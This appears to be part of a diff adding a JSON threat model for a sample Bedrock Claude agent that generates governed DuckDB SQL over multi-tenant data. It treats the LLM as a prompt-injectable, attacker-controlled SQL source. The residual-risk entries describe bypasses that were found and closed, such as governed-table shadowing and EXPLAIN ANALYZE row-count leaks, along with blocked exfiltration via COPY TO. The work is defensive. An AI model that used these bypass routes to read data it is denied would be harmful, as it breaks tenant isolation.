+   "authorization_method": "Policy-based",
+   "description": "UI invokes the runtime with Authorization: Bearer <Cognito ID token>; the managed customJWTAuthorizer validates signature (discovery URL) and allowedAudience BEFORE any agent code; no-token=401, forged=403. SSE envelope stream returns over the same channel."
+  },
+  {
+   "id": "CP003",
+   "source_zone_id": "TZ002",
+   "destination_zone_id": "TZ003",
+   "connection_ids": [
+    "CN003"
+   ],
+   "authentication_method": "Token",
+   "authorization_method": "Role-based",
+   "description": "Verified identity crosses from the managed authorizer into agent code as claims; _resolve_claims normalizes custom:tenant/custom:role -> tenant:role (JWT decode without re-verification is claims EXTRACTION, not authentication). Weaker fallback sources (user-id header / payload identity) are SigV4-caller-asserted."
+  },
+  {
+   "id": "CP004",
+   "source_zone_id": "TZ001",
+   "destination_zone_id": "TZ003",
+   "connection_ids": [
+    "CN005"
+   ],
+   "authentication_method": "None",
+   "authorization_method": "Policy-based",
+   "description": "LLM-generated SQL (attacker-influenceable via prompt injection) crosses into the agent process. THE central boundary: single-statement read-only gate, then governance rewrite."
+  },
+  {
+   "id": "CP005",
+   "source_zone_id": "TZ003",
+   "destination_zone_id": "TZ004",
+   "connection_ids": [
+    "CN008",
+    "CN009",
+    "CN010"
+   ],
+   "authentication_method": "IAM Role",
+   "authorization_method": "Role-based",
+   "description": "Engine reads S3/catalog/label data and Secrets Manager with the scoped read-only execution role over TLS. Only governed SQL output flows back."
+  },
+  {
+   "id": "CP006",
+   "source_zone_id": "TZ001",
+   "destination_zone_id": "TZ002",
+   "connection_ids": [
+    "CN011"
+   ],
+   "authentication_method": "IAM Role",
+   "authorization_method": "Role-based",
+   "description": "Agent model loop calls Amazon Bedrock (Claude) with the runtime execution role; prompts carry untrusted user text, responses carry untrusted SQL."
+  }
+ ],
+ "trustBoundaries": [
+  {
+   "id": "TB001",
+   "name": "Inbound AuthN edge (Cognito + managed authorizer)",
+   "type": "Network",
+   "crossing_points": [
+    "CP001",
+    "CP002"
+   ],
+   "controls": [
+    "Cognito user pool AuthN (USER_PASSWORD_AUTH + SECRET_HASH)",
+    "AgentCore customJWTAuthorizer: signature via discovery URL + allowedAudience validation BEFORE agent code",
+    "requestHeaderAllowlist limits forwarded headers to Authorization",
+    "TLS on all calls"
+   ],
+   "description": "The deployed sample's real authentication perimeter: only requests carrying a valid Cognito ID token for the configured audience reach a runtime session. Verified: no-token=401, forged-token=403, both pre-code."
+  },
+  {
+   "id": "TB002",
+   "name": "Platform -> agent identity handoff",
+   "type": "Virtual Machine",
+   "crossing_points": [
+    "CP003"
+   ],
+   "controls": [
+    "Managed authorizer verifies before agent code",
+    "claims normalization custom:tenant/custom:role -> tenant:role",
+    "trust-ordered fallback chain with default-role floor",
+    "unknown role in a known tenant -> tenant's MOST restricted policy (content-derived ranking, order-independent)"
+   ],
+   "description": "Verified identity crosses from the managed authorizer into agent code as claims. AuthN happens platform-side; the sample only consumes verified claims. SigV4 fallback identity sources are caller-asserted (documented trust assumption, local/CLI path only)."
+  },
+  {
+   "id": "TB003",
+   "name": "Untrusted SQL -> agent controls",
+   "type": "Process",
+   "crossing_points": [
+    "CP004",
+    "CP006"
+   ],
+   "controls": [
+    "single-statement rule via duckdb.extract_statements (engine's own parser)",
+    "leading-comment stripping before keyword classification",
+    "read-only statement allowlist (read + CREATE TEMP)",
+    "governance rewrite: RLS guarded subqueries, schema-aware CLS EXCLUDE",
+    "explicit denied-column selection rejected with a legible policy error",
+    "raw table functions: AST-shape ALLOWLIST (Identifier sources only; pure generators excepted)",
+    "fail-closed on unparseable SQL"
+   ],
+   "description": "LLM-generated SQL (attacker-influenceable via prompt injection) crosses into the agent process. THE central boundary of this model. All controls mutation-tested (code validation)."
+  },
+  {
+   "id": "TB004",
+   "name": "Agent -> customer data plane",
+   "type": "Account",
+   "crossing_points": [
+    "CP005"
+   ],
+   "controls": [
+    "scoped read-only IAM execution role",
+    "READ_ONLY catalog attaches",
+    "TLS in transit",
+    "SSE + BlockPublicAccess + enforce_ssl on buckets",
+    "Secrets Manager for PG credentials"
+   ],
+   "description": "Engine reads S3/catalog/label data with the scoped read-only execution role over TLS. Only governed SQL output flows back."
+  }
+ ],
+ "assets": [
+  {
+   "id": "A001",
+   "name": "Governed analytical rows/columns",
+   "type": "Data",
+   "classification": "Internal",
+   "lifecycle_state": null,
+   "data_states": [
+    "At rest",
+    "In transit",
+    "In use"
+   ],
+   "description": "The per-tenant visible slice of the analytical + label tables (rows within the tenant's policy window; columns minus denies, e.g. subject_identity). The thing the authorization layer protects; sample data is public/synthetic, customer-substituted data may be confidential.",
+   "owner": null,
+   "criticality": 4,
+   "metadata": {}
+  },
+  {
+   "id": "A002",
+   "name": "Cognito ID token (tenant/role claims)",
+   "type": "Token",
+   "classification": "Confidential",
+   "lifecycle_state": null,
+   "data_states": [
+    "In transit",
+    "In use"
+   ],
+   "description": "Bearer of identity: aud = app client id; custom:tenant/custom:role drive policy selection. Theft or forgery = principal impersonation for the token lifetime.",
+   "owner": null,
+   "criticality": 5,
+   "metadata": {}
+  },
+  {
+   "id": "A003",
+   "name": "Cognito app client secret",
+   "type": "Credential",
+   "classification": "Restricted",
+   "lifecycle_state": null,
+   "data_states": [
+    "At rest",
+    "In use"
+   ],
+   "description": "Needed (with a user password) to complete USER_PASSWORD_AUTH. Held in the UI process env; not in the repo.",
+   "owner": null,
+   "criticality": 3,
+   "metadata": {}
+  },
+  {
+   "id": "A004",
+   "name": "GOVERNANCE_POLICIES configuration",
+   "type": "Configuration",
+   "classification": "Internal",
+   "lifecycle_state": null,
+   "data_states": [
+    "At rest",
+    "In use"
+   ],
+   "description": "The authorization policy table (row filters, column denies, raw-path switch, per tenant:role). Its correctness IS the authorization posture.",
+   "owner": null,
+   "criticality": 4,
+   "metadata": {}
+  },
+  {
+   "id": "A005",
+   "name": "Agent-generated SQL (untrusted)",
+   "type": "Data",
+   "classification": "Internal",
+   "lifecycle_state": null,
+   "data_states": [
+    "In transit",
+    "In use"
+   ],
+   "description": "LLM output derived from user natural language; adversarial by assumption (prompt injection). Every statement passes gate + governance before execution.",
+   "owner": null,
+   "criticality": 4,
+   "metadata": {}
+  }
+ ],
+ "flows": [
+  {
+   "id": "F001",
+   "asset_id": "A002",
+   "source_id": "C002",
+   "destination_id": "C001",
+   "transformation_type": "Signing",
+   "controls": [
+    "Authentication",
+    "Encryption"
+   ],
+   "description": "Cognito issues the signed ID token to the UI after USER_PASSWORD_AUTH.",
+   "protocol": "HTTPS",
+   "encryption": true,
+   "authenticated": true,
+   "authorized": false,
+   "validated": false,
+   "risk_level": null
+  },
+  {
+   "id": "F002",
+   "asset_id": "A002",
+   "source_id": "C001",
+   "destination_id": "C003",
+   "transformation_type": "Verification",
+   "controls": [
+    "Authentication",
+    "Encryption"
+   ],
+   "description": "UI presents the bearer token; the managed authorizer verifies signature + audience before agent code.",
+   "protocol": "HTTPS",
+   "encryption": true,
+   "authenticated": true,
+   "authorized": false,
+   "validated": false,
+   "risk_level": null
+  },
+  {
+   "id": "F003",
+   "asset_id": "A003",
+   "source_id": "C001",
+   "destination_id": "C002",
+   "transformation_type": "Hashing",
+   "controls": [
+    "Authentication",
+    "Encryption"
+   ],
+   "description": "App client secret used for SECRET_HASH during login; never leaves the UI process except as the HMAC.",
+   "protocol": "HTTPS",
+   "encryption": true,
+   "authenticated": true,
+   "authorized": false,
+   "validated": false,
+   "risk_level": null
+  },
+  {
+   "id": "F004",
+   "asset_id": "A005",
+   "source_id": "C005",
+   "destination_id": "C006",
+   "transformation_type": "Processing",
+   "controls": [
+    "Input Validation"
+   ],
+   "description": "Untrusted LLM SQL enters the single-statement read-only gate (comment-strip + engine-parser statement count + keyword allowlist).",
+   "protocol": null,
+   "encryption": true,
+   "authenticated": false,
+   "authorized": false,
+   "validated": true,
+   "risk_level": 4
+  },
+  {
+   "id": "F005",
+   "asset_id": "A005",
+   "source_id": "C006",
+   "destination_id": "C007",
+   "transformation_type": "Processing",
+   "controls": [
+    "Authorization",
+    "Input Validation"
+   ],
+   "description": "Gate-passed statement is rewritten under the principal's policy (RLS/CLS/raw-path allowlist/denied-column rejection; fail-closed parse).",
+   "protocol": null,
+   "encryption": true,
+   "authenticated": false,
+   "authorized": false,
+   "validated": true,
+   "risk_level": 3
+  },
+  {
+   "id": "F006",
+   "asset_id": "A004",
+   "source_id": "C007",
+   "destination_id": "C007",
+   "transformation_type": "Processing",
+   "controls": [
+    "Authorization"
+   ],
+   "description": "Policy table consulted for principal->role->policy resolution (unknown role -> tenant's most restricted; content-derived ranking).",
+   "protocol": null,
+   "encryption": false,
+   "authenticated": false,
+   "authorized": false,
+   "validated": false,
+   "risk_level": null
+  },
+  {
+   "id": "F007",
+   "asset_id": "A001",
+   "source_id": "D001",
+   "destination_id": "C008",
+   "transformation_type": "Redaction",
+   "controls": [
+    "Authorization",
+    "Access Control",
+    "Encryption"
+   ],
+   "description": "Engine reads only the governed subquery's rows/columns from the analytical tables (RLS predicate + CLS EXCLUDE applied in the rewritten SQL).",
+   "protocol": "HTTPS",
+   "encryption": true,
+   "authenticated": false,
+   "authorized": true,
+   "validated": false,
+   "risk_level": null
+  },
+  {
+   "id": "F008",
+   "asset_id": "A001",
+   "source_id": "D002",
+   "destination_id": "C008",
+   "transformation_type": "Redaction",
+   "controls": [
+    "Authorization",
+    "Access Control",
+    "Encryption"
+   ],
+   "description": "Label-table joins under the same governance (tenant sees only its own exchange rows; junior loses subject_identity).",
+   "protocol": "HTTPS",
+   "encryption": true,
+   "authenticated": false,
+   "authorized": true,
+   "validated": false,
+   "risk_level": null
+  },
+  {
+   "id": "F009",
+   "asset_id": "A001",
+   "source_id": "C008",
+   "destination_id": "C001",
+   "transformation_type": "Aggregation",
+   "controls": [
+    "Encryption",
+    "Output Encoding"
+   ],
+   "description": "Governed results (rows JSON + engine metrics + trace envelopes) stream back to the UI over SSE; per-statement trace exposes gate/govern/execute metadata but only policy-permitted data.",
+   "protocol": "HTTPS",
+   "encryption": true,
+   "authenticated": false,
+   "authorized": false,
+   "validated": false,
+   "risk_level": null
+  }
+ ],
+ "residualRiskAssessments": [
+  {
+   "threat_id": "T001",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Unlikely",
+   "rationale": "AST-level rewrite covers all four access paths; the completeness rules close the two bypasses found on 2026-09-03 - local names may not shadow a governed table (M018) and unmodellable statement shapes are rejected (M017) - so a governed name always denotes the governed table and no statement reaches the engine unrewritten. 49 adversarial regressions (nine shadowing shapes incl. recursive CTE, CTAS target and alias forms) plus per-persona cloud verification on runtime v15. Residual: novel sqlglot-vs-DuckDB semantic divergence, bounded by fail-closed parsing and a read-only worst case.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T002",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Unlikely",
+   "rationale": "Unparseable SQL is rejected for restricted principals, and SQL that parses only as an opaque Command is now rejected too (M017) - previously the fail-closed claim covered parse FAILURE but not parse DEGRADATION, which was the live bypass. A statement would need to parse cleanly into a governable root in sqlglot AND mean something different to DuckDB; worst case is still read-only within the session.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T003",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Unlikely",
+   "rationale": "Single-statement rule uses the engine's own parser (no lexer divergence to aim at); mutation-verified; end-to-end test proves the second statement never reaches the engine. Layers 2-3 (READ_ONLY attaches, no write IAM) still bound any residual.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T004",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Unlikely",
+   "rationale": "Posture inverted to an AST-shape allowlist: new DuckDB file functions are rejected by default rather than slipping past a stale name list. Additions to the generator exception list require explicit justification. Cloud-verified rejection.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T005",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Unlikely",
+   "rationale": "Fallback is content-derived and declaration-order independent; tested with the two-policy tenant shape that exposed the original bug. Residual: an operator could still author a 'most restricted' policy that is broader than intended - covered by T011.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T006",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Possible",
+   "rationale": "Platform-enforced pre-code validation (401/403 verified live). Residual: stolen VALID tokens are T008; the platform's authorizer is AWS-managed and out of sample scope.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T007",
+   "decision": "Accepted",
+   "residual_severity": "Medium",
+   "residual_likelihood": "Possible",
+   "rationale": "Documented trust assumption on the local/CLI SigV4 path only: the caller is IAM-authenticated infrastructure trusted to assert its users' identity (standard service-to-service identity propagation). The deployed path uses the JWT authorizer, where these fallback sources are unreachable because the authorizer rejects unauthenticated requests pre-code.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T008",
+   "decision": "Accepted",
+   "residual_severity": "Medium",
+   "residual_likelihood": "Possible",
+   "rationale": "Bearer-token theft is inherent to token auth; lifetime bounds exposure. The app client can no longer write custom:tenant/custom:role, so a stolen session cannot be escalated beyond the victim's own role (M020, T018). Demo credentials remain rotate-before-exposing (operator responsibility) and MFA is deliberately OFF for demo convenience - production guidance: short token TTLs, MFA on the pool, restricted app client. Analyst-host security is out of scope for a sample.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T009",
+   "decision": "Accepted",
+   "residual_severity": "Low",
+   "residual_likelihood": "Possible",
+   "rationale": "Inference/side channels against RLS/CLS are an industry-wide limitation of query-rewrite governance (shared with BI-tool row-level security and warehouse RLS). One CONCRETE oracle in this class - EXPLAIN ANALYZE reporting true cardinalities of denied rows - was a real defect, not an accepted residual, and is closed by M017. What remains accepted is aggregate-inference and timing, with guidance to use physical separation for high-sensitivity multi-tenant data. Sample dataset is public/synthetic.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T010",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Likely",
+   "rationale": "Blast radius is structurally one microVM; envelope caps memory with spill. Cost exposure is the customer's own account and bounded by their throttles/budgets. Remaining: per-request cost, standard for any LLM app.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T011",
+   "decision": "Accepted",
+   "residual_severity": "Low",
+   "residual_likelihood": "Possible",
+   "rationale": "Policy authoring remains the operator's responsibility, but the two fail-open defaults are gone: the default role is the deny-all floor rather than ops:admin (M019), and the policy table is validated at load - key shape, known fields, bare identifiers, one-predicate row_filter, no allow_raw_paths-with-governed-tables (M021). LABELS_PREFIX, which decides what a sanctions screen compares against, is validated and bucket-restricted (M022). Residual: a semantically wrong but well-formed policy (e.g. an over-broad row_filter) still governs as written; the governed trace (M011) gives the audit signal.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T012",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Unlikely",
+   "rationale": "Probe failure keeps the full denylist (fail-closed); cache is per-session/per-principal by construction. Residual only if the customer redeploys the module multi-principal - covered by T015.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T013",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Unlikely",
+   "rationale": "Three independent layers: statement gate allowlist, READ_ONLY attaches, IAM role without write permissions. COPY TO and ATTACH explicitly rejected with tests.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T014",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Unlikely",
+   "rationale": "_conn_lock serializes execute+fetch atomically incl. the schema probe; the async-generator tool preserves lock semantics via asyncio.to_thread; regression test exists. Single-principal-per-session makes the worst case an integrity glitch, not cross-principal leakage.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T015",
+   "decision": "Accepted",
+   "residual_severity": "High",
+   "residual_likelihood": "Possible",
+   "rationale": "Misuse-of-sample risk: the module-level active-role slot is only safe under one-session-one-principal (AgentCore microVM). Cannot be closed by code in a sample - the misuse happens in the consumer's fork. Controlled by prominent documentation (module docstring + README + this model). Accepted with the HIGH residual kept visible on purpose.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T016",
+   "decision": "Accepted",
+   "residual_severity": "Low",
+   "residual_likelihood": "Likely",
+   "rationale": "Deliberate transparency tradeoff: the trace shows the principal only their OWN policy application - the same information the clean rejection message conveys - never another tenant's policy or data. Deployments preferring opacity have a single filter point (_map_event). Demo legibility is the sample's purpose.",
+   "is_current": true
+  },
+  {
+   "threat_id": "T017",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Unlikely",
+   "is_current": true,
+   "rationale": "Statement-shape allowlist on the parsed root (M017) rejects opaque shapes for restricted principals; regression tests cover EXPLAIN, EXPLAIN ANALYZE and SHOW <table>, and cloud acceptance confirms no plan is emitted. Residual: a NEW syntax that sqlglot models as a governable root but DuckDB interprets differently - bounded by the read-only gate and the same fail-closed parse as T002."
+  },
+  {
+   "threat_id": "T018",
+   "decision": "Mitigated",
+   "residual_severity": "Low",
+   "residual_likelihood": "Unlikely",
+   "is_current": true,
+   "rationale": "App client attribute permissions make custom:tenant/custom:role read-only (M020); verified live against the deployed pool - UpdateUserAttributes returns NotAuthorizedException and claims are unchanged after re-login. Residual: an operator with Cognito admin rights can still misassign roles (same class as IAM role assignment, A007), and MFA is deliberately OFF in this demo, so a stolen password is a stolen identity (T008)."
+  }
+ ],
+ "softwareProfile": {
+  "software_type": "AI / ML System",
+  "deployment_model": "Serverless / FaaS",
+  "architecture_style": "Serverless",
+  "platform_runtime": "Cloud runtime",
+  "user_domain": "Financial",
+  "licensing_ownership": "Open source",
+  "modern_paradigms": [
+   "Agentic AI",
+   "Cloud-native"
+  ],
+  "description": "Python 3.11-3.13 on Amazon Bedrock AgentCore Runtime (one microVM per session). Core modules: (1) agent.py - Strands Agent + Bedrock Claude with one gated async-generator run_sql tool over an in-memory DuckDB (httpfs/iceberg/ducklake extensions). The read-only gate enforces EXACTLY ONE statement per call (duckdb.extract_statements, the engine's own parser) and strips leading SQL comments before keyword classification; identity resolution chain: verified JWT claims (custom:tenant/custom:role normalized) -> runtime user-id header -> payload identity -> default role. The streaming entrypoint (async generator -> SSE) emits typed envelopes incl. a per-statement gate/govern/execute trace. (2) governance.py - authorization: principal->role->policy mapping where an unknown role inside a known tenant falls back to that tenant's MOST RESTRICTED policy (content-derived restrictiveness ranking, declaration-order independent); sqlglot AST rewrite injecting RLS predicates via guarded subqueries and schema-aware CLS EXCLUDE; explicit selection of a denied column is rejected with a legible policy error naming column and role; raw table functions are governed by an ALLOWLIST on AST shape (only exp.Identifier FROM/JOIN sources allowed; pure generators excepted) rather than a function-name denylist; fail-closed on unparseable SQL. (3) ui/app.py - Streamlit chat client: Cognito USER_PASSWORD_AUTH login (client secret via env), sends the ID token as bearer to the runtime over raw HTTPS, renders the interleaved reasoning+tool transcript and a Trace tab. (4) infra/ CDK - S3 buckets (SSE, BlockPublicAccess, enforce_ssl), Cognito user pool + app client, least-privilege execution role, CloudWatch logs. CI: GitLab pipeline with ruff/bandit/semgrep/detect-secrets/pytest gates (96 offline unit tests incl. mutation-verified fail-closed authz tests)."
+ },
+ "dataAssetProfiles": [
+  {
+   "id": "DP001",
+   "name": "Analytical dataset on S3",
+   "asset_id": null,
+   "structural_category": "Structured Data",
+   "content_types": [
+    "Non-sensitive / other"
+   ],
+   "sensitivity_tier": "Public",
+   "compliance_regimes": [],
+   "data_states": [
+    "At rest",
+    "In transit"
+   ],
+   "volume_tier": "Big data",
+   "lifecycle_state": "Active",
+   "business_domain": null,
+   "description": "Parquet/Iceberg tables on S3: public aws-public-blockchain Ethereum data (eth_traces incident-window slice in S3 Tables/Glue/DuckLake legs, full history via raw views). Customer-substituted data may be confidential. Per-tenant visibility is enforced by the RLS/CLS rewrite - the asset the governance layer protects."
+  },
+  {
+   "id": "DP002",
+   "name": "Identity claims (tenant, role)",
+   "asset_id": null,
+   "structural_category": "API Data",
+   "content_types": [
+    "Authentication credentials"
+   ],
+   "sensitivity_tier": "Internal",
+   "compliance_regimes": [],
+   "data_states": [
+    "In transit",
+    "In use"
+   ],
+   "volume_tier": null,
+   "lifecycle_state": null,
+   "business_domain": null,
+   "description": "Cognito ID-token claims (custom:tenant/custom:role) validated by the AgentCore managed inbound JWT authorizer (allowedAudience) BEFORE agent code runs, then normalized by _resolve_claims; or identity asserted by a SigV4-authenticated calling application (runtime user-id header / payload identity - local/CLI path). Integrity of these claims is the security foundation of the authorization layer."
+  },
+  {
+   "id": "DP003",
+   "name": "Governance policy table",
+   "asset_id": null,
+   "structural_category": "Configuration Data",
+   "content_types": [
+    "System metadata"
+   ],
+   "sensitivity_tier": "Internal",
+   "compliance_regimes": [],
+   "data_states": [
+    "At rest",
+    "In use"
+   ],
+   "volume_tier": null,
+   "lifecycle_state": null,
+   "business_domain": null,
+   "description": "GOVERNANCE_POLICIES JSON env configuration: per-table row_filter / deny_columns + allow_raw_paths switch, keyed by tenant:role. Defines who sees what; owned by the operator. Unknown roles in a known tenant resolve to the tenant's most restricted policy (content-derived ranking)."
+  },
+  {
+   "id": "DP004",
+   "name": "Attribution label tables",
+   "asset_id": null,
+   "structural_category": "Structured Data",
+   "content_types": [
+    "PII",
+    "Non-sensitive / other"
+   ],
+   "sensitivity_tier": "Internal",
+   "compliance_regimes": [],
+   "data_states": [
+    "At rest",
+    "In transit"
+   ],
+   "volume_tier": "Small",
+   "lifecycle_state": null,
+   "business_domain": null,
+   "description": "ofac_addresses (REAL public OFAC SDN list, ~120 rows) and cex_deposit_labels (SYNTHETIC exchange deposit labels whose subject_identity column mimics customer KYC linkage to demonstrate CLS). subject_identity is column-denied to the junior role; in a real deployment this table carries actual KYC linkage and its protection is the point of the CLS demo."
+  },
+  {
+   "id": "DP005",
+   "name": "Cognito app client secret",
+   "asset_id": null,
+   "structural_category": "Secrets and Credentials",
+   "content_types": [
+    "Authentication credentials"
+   ],
+   "sensitivity_tier": "Restricted",
+   "compliance_regimes": [],
+   "data_states": [
+    "At rest",
+    "In use"
+   ],
+   "volume_tier": null,
+   "lifecycle_state": null,
+   "business_domain": null,
+   "description": "App client secret used by the Streamlit UI for SECRET_HASH computation during USER_PASSWORD_AUTH login. Supplied via environment variable to the UI process; never committed to the repo."
+  },
+  {
+   "id": "DP006",
+   "name": "DuckLake PostgreSQL credentials",
+   "asset_id": null,
+   "structural_category": "Secrets and Credentials",
+   "content_types": [
+    "Authentication credentials"
+   ],
+   "sensitivity_tier": "Restricted",
+   "compliance_regimes": [],
+   "data_states": [
+    "At rest",
+    "In use"
+   ],
+   "volume_tier": null,
+   "lifecycle_state": null,
+   "business_domain": null,
+   "description": "Optional multi-writer catalog credentials stored in AWS Secrets Manager, fetched at runtime by the execution role; never in env vars or code."
+  }
+ ],
+ "userPersonas": [
+  {
+   "id": "UP001",
+   "persona_type": "Authenticated Standard User",
+   "name": "End user (investigator / junior analyst)",
+   "privilege_level": "Low",
+   "organizational_affiliation": "Customer",
+   "functional_roles": [
+    "End User"
+   ],
+   "intent_behavior": "Legitimate",
+   "entity_type": "Human",
+   "authentication_method": "Token",
+   "threat_actor_overlay": [],
+   "description": "Logs in at Cognito; ID-token claims carry tenant/role; may be a restricted principal whose data visibility is limited by RLS/CLS policy. Primary adversary in this model: tries to observe other tenants' rows or denied columns through crafted natural-language questions (prompt injection into generated SQL).",
+   "is_relevant": true
+  },
+  {
+   "id": "UP002",
+   "persona_type": "Non-Human Identity / Service Account",
+   "name": "Calling application (SigV4)",
+   "privilege_level": "Elevated",
+   "organizational_affiliation": "Customer",
+   "functional_roles": [
+    "Integration Endpoint"
+   ],
+   "intent_behavior": "Legitimate",
+   "entity_type": "Non-Human",
+   "authentication_method": "IAM Role",
+   "threat_actor_overlay": [],
+   "description": "IAM-authenticated infrastructure invoking the runtime on the local/CLI path; trusted to assert its end-users' identity via the runtime user-id header or payload identity object. Its compromise means arbitrary identity assertion - documented trust assumption; unused when the JWT authorizer is configured (the deployed default).",
+   "is_relevant": true
+  },
+  {
+   "id": "UP003",
+   "persona_type": "Developer / DevOps User",
+   "name": "Operator (deployer)",
+   "privilege_level": "Administrative",
+   "organizational_affiliation": "Customer",
+   "functional_roles": [
+    "Administrator",
+    "Developer"
+   ],
+   "intent_behavior": "Legitimate",
+   "entity_type": "Human",
+   "authentication_method": "IAM Role",
+   "threat_actor_overlay": [],
+   "description": "Customer engineer deploying the sample; owns all env configuration including GOVERNANCE_POLICIES, Cognito pool/users, and catalog ARNs. Out of scope as an adversary (owns the account and the data).",
+   "is_relevant": true
+  },
+  {
+   "id": "UP004",
+   "persona_type": "Non-Human Identity / Service Account",
+   "name": "LLM (Bedrock Claude)",
+   "privilege_level": "Low",
+   "organizational_affiliation": null,
+   "functional_roles": [
+    "Service Account"
+   ],
+   "intent_behavior": "Compromised",
+   "entity_type": "Non-Human",
+   "authentication_method": "None",
+   "threat_actor_overlay": [],
+   "description": "Generates SQL from natural language. Untrusted-input channel: its output executes against the engine after the single-statement read-only gate and governance rewrite. Subject to prompt injection via user questions; treated as an attacker-controlled SQL source in this model.",
+   "is_relevant": true
+  }
+ ],
+ "nonFunctionalRequirements": [
+  {
+   "quality_class": "Fail-Safe Behaviour",
+   "level": "Revert to safe state",
+   "rationale": "The governance layer must fail closed: a restricted principal must never observe rows or columns outside their policy via any of the four access paths. Unparseable SQL, schema-probe failure, unknown principal (falls to the tenant's MOST restricted policy or the default role), and explicit denied-column selection must result in rejection or the most restrictive policy - never fail-open. Verified by mutation testing (code-validation fixes)."
+  },
+  {
+   "quality_class": "User Error Protection",
+   "level": "Strong",
+   "rationale": "Agent-generated SQL (which may be wrong or adversarial via prompt injection) must not write persistently, exfiltrate to external targets (COPY TO), attach foreign databases, smuggle a second statement behind a read (single-statement rule enforced with the engine's own parser), or reach raw file-reading table functions as a restricted principal (AST-shape allowlist, not a name denylist)."
+  }
+ ],
+ "phaseProgress": {
+  "current_phase": 9,
+  "current_phase_name": "Output Generation and Documentation",
+  "phase_completion": {
+   "1": 1.0,
+   "2": 1.0,
+   "3": 1.0,
+   "4": 1.0,
+   "5": 1.0,
+   "6": 1.0,
+   "7": 1.0,
+   "7.5": 1.0,
+   "8": 1.0,
+   "9": 1.0
+  },
+  "phases": {
+   "1": "Business Context Analysis",
+   "2": "Architecture Analysis",
+   "3": "Threat Actor Analysis",
+   "4": "Trust Boundary Analysis",
+   "5": "Asset Flow Analysis",
+   "6": "Threat Identification",
+   "7": "Mitigation Planning",
+   "7.5": "Code Validation Analysis",
+   "8": "Residual Risk Analysis",
+   "9": "Output Generation and Documentation"
+  },
+  "overall_completion": 1.0
+ },
+ "referenceCatalogue": {
+  "description": "Threat actors the server pre-loaded but that were never assessed for this system. These are NOT part of the threat model.",
+  "threatActors": []
+ }
 }
